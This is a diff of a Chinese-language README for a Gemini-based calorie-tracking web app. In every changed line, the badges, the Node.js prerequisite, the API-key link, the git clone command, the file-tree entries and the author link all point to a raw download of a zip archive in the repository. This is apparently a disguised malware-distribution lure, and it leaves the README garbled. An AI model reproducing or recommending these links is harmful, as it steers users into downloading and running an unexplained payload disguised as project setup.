@@ -2,7 +2,7 @@
 
 一個基於 AI 的食物營養分析 PWA (Progressive Web App)，使用 Google Gemini Vision API 識別食物並估算營養成分。
 
-![NutriScan AI](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip) ![Vite](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip) ![Google Gemini](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip%20Gemini-2.5--flash-orange)
+![NutriScan AI](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip) ![Vite](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip) ![Google Gemini](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip%20Gemini-2.5--flash-orange)
 
 ## ✨ 功能特點
 
@@ -23,15 +23,15 @@
 
 ### 前置要求
 
-- https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip 16+ 
+- https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip 16+ 
 - npm 或 yarn
-- Google AI Studio API Key ([獲取 API Key](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip))
+- Google AI Studio API Key ([獲取 API Key](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip))
 
 ### 安裝步驟
 
 1. **克隆項目**
 ```bash
-git clone https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip
+git clone https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip
 cd calloriesTracker
 ```
 
@@ -114,13 +114,13 @@ vercel
 ```
 calloriesTracker/
 ├── src/
-│   ├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip          # 主應用組件
-│   ├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip        # 全局樣式
-│   └── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip         # 應用入口
+│   ├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip          # 主應用組件
+│   ├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip        # 全局樣式
+│   └── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip         # 應用入口
 ├── public/              # 靜態資源
 ├── .env                 # 環境變量（需自行創建）
-├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip       # Vite 配置
-└── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip         # 項目依賴
+├── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip       # Vite 配置
+└── https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip         # 項目依賴
 ```
 
 ## 🤝 貢獻
@@ -133,7 +133,7 @@ MIT License
 
 ## 👨‍💻 作者
 
-Created by [yongsinfok](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/.claude/Tracker_callories_2.6.zip)
+Created by [yongsinfok](https://github.com/yongsinfok/calloriesTracker/raw/refs/heads/main/src/assets/callories_Tracker_3.8.zip)
 
 ---
 
